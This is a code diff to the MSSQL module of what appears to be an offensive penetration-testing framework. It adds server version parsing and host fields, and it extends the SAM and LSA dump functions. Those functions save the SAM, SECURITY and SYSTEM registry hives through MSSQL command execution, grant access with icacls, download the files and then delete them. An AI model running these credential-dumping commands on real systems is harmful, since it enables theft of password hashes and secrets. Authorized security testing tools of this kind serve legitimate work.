@@ -96,6 +96,13 @@ class mssql(connection):
             # If the MSSQL Server responds with a TDS_ENCRYPT_REQ or TDS_ENCRYPT_OFF then we need to setup a TLS context
             resp = self.conn.preLogin()
             self.encryption = False
+
+            # Parses the MSSQL version
+            self.edition, self.version = (
+                str(self.conn.mssql_version).split("Server ")[1].split(" (")[0],
+                str(self.conn.mssql_version).rsplit("(", 1)[1].rstrip(")")
+            )
+
             if resp["Encryption"] == TDS_ENCRYPT_REQ or resp["Encryption"] == TDS_ENCRYPT_OFF:
                 # We switch to a TLS context handled by tds.py
                 self.conn.set_tls_context()
@@ -147,7 +154,7 @@ class mssql(connection):
                 self.logger.debug(f"Server does not support NTLM{detail}")
                 self.no_ntlm = True
 
-        self.db.add_host(self.host, self.hostname, self.domain, self.server_os, len(self.mssql_instances))
+        self.db.add_host(self.host, self.hostname, self.domain, self.server_os, self.version, len(self.mssql_instances), self.encryption)
 
         if self.args.domain:
             self.domain = self.args.domain
@@ -164,7 +171,7 @@ class mssql(connection):
     def print_host_info(self):
         encryption = colored(f"EncryptionReq:{self.encryption}", host_info_colors[0 if self.encryption else 1], attrs=["bold"])
         ntlm = colored(f"(NTLM:{not self.no_ntlm})", host_info_colors[2], attrs=["bold"]) if self.no_ntlm else ""
-        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain}) ({encryption}) {ntlm}")
+        self.logger.display(f"{self.server_os} ({self.edition} {self.version}) (name:{self.hostname}) (domain:{self.targetDomain}) ({encryption}) {ntlm}")
 
     @reconnect_mssql
     def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
@@ -462,7 +469,7 @@ class mssql(connection):
 
             for n, item in enumerate(raw_output):
                 username = item[""]
-                if username == "NULL":
+                if username is None:
                     continue
                 rid = so_far + n
                 self.logger.highlight(f"{rid}: {username}")
@@ -554,10 +561,12 @@ class mssql(connection):
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        get_owner_command = f"icacls C:\\windows\\temp\\{sam_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="sam")
         try:
             exec_method = MSSQLEXEC(self.conn, self.logger)
             exec_method.execute(dump_command)
+            exec_method.execute(get_owner_command)
             exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
             exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
             exec_method.execute(clean_command)
@@ -587,10 +596,12 @@ class mssql(connection):
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        get_owner_command = f"icacls C:\\windows\\temp\\{security_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="lsa")
         try:
             exec_method = MSSQLEXEC(self.conn, self.logger)
             exec_method.execute(dump_command)
+            exec_method.execute(get_owner_command)
             exec_method.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
             exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
             exec_method.execute(clean_command)
